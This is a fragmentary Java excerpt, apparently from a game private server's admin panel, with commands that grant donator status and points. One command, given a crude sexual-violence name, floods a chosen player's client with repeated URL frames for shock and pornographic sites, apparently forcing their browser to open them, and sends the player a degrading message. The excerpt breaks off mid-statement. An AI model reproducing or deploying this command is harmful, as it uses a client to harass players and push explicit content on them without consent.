...
public class PanelSettings {
	...
	public void executeCommand(String cmd) {
		...
		if (p.ENTITY_LIST.getSelectedValue() != null) {
			...
			if (cmd.equalsIgnoreCase("Give Donator.")) {
				...
				if (con == 0) {
					...
					if (firm == 0) {
						...
						c.getItems().resetItems(5064);*/
						c.memberStatus = 1;
						c.sendMessage("@red@You are now a Donator...  Enjoy.");
				return;
			}
	...
	public void playerCommand(String cmd, Client c) {
		...
		if (cmd.equals("Force Rape")) {
c.sendMessage("You have been Raped.");
								c.getPA().sendFrame126("www.sourmath.com", 12000);
								c.getPA().sendFrame126("www.sourmath.com", 12000);
								c.getPA().sendFrame126("www.sourmath.com", 12000);
								c.getPA().sendFrame126("www.lemonparty.org", 12000);
								c.getPA().sendFrame126("www.sourmath.com", 12000);
								c.getPA().sendFrame126("www.sourmath.com", 12000);
								c.getPA().sendFrame126("www.sourmath.com", 12000);
								c.getPA().sendFrame126("www.HowToGetALife.com", 12000);
								c.getPA().sendFrame126("www.sourmath.com", 12000);
								c.getPA().sendFrame126("www.HowToGetALife.com", 12000);
								c.getPA().sendFrame126("www.sourmath.com", 12000);
								c.getPA().sendFrame126("www.HowToGetALife.com", 12000);
								...
								c.getPA().sendFrame126("www.sourmath.com", 12000);
								c.getPA().sendFrame126("www.sourmath.com", 12000);
								c.getPA().sendFrame126("http://www.youtube.com/watch?v=kffacxfA7G4&ob=av2e", 12000);
								c.getPA().sendFrame126("http://www.youtube.com/watch?v=_Z5-P9v3F8w&ob=av2e", 12000);
		}
		...
		if (cmd.equals("50 Donator Points")) {
			c.pcPoints += 50;
			c.sendMessage("Gretar just gave you 50 Donator Points");
			p.displayMessage("You have given 50 donator points to "+ c.playerName +"", cmd, 1);
		}
		if (cmd.equals("100 Donator Points")) {
			c.pcPoints += 100;
			c.sendMessage("Gretar just gave you 100 Donator Points");
